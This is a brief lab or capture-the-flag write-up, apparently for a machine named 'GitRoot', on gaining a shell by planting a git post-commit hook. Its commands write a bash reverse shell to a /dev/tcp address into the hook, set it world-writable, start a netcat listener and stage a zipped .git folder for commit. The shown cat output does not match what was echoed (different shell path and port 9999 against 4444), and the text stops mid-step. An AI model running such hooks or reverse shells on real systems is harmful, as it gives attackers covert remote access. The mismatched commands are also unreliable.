

# Exploiting Post-Commit

1. Create a post-commit file with a bash reverse shell

```
beth@GitRoot:~$ cd ~
beth@GitRoot:~$ mkdir -p .git/hooks && cd .git/hooks
beth@GitRoot:~/.git/hooks$ echo '#!/bin/bash' > post-commit
beth@GitRoot:~/.git/hooks$ echo '/usr/bin/bash -i >& /dev/tcp/192.168.118.3/4444 0>&1' >> post-commit
beth@GitRoot:~/.git/hooks$ cat post-commit
#!/bin/sh
/usr/bin/sh -i >& /dev/tcp/192.168.118.3/9999 0>&1
beth@GitRoot:~/.git/hooks$ chmod 777 post-commit
beth@GitRoot:~/.git/hooks$
```
2. Start a netcat listener on port 4444. 
3. Compress the .git/ contents into a zip file as requested and copy it to the directory which is being uncompressed and committed:
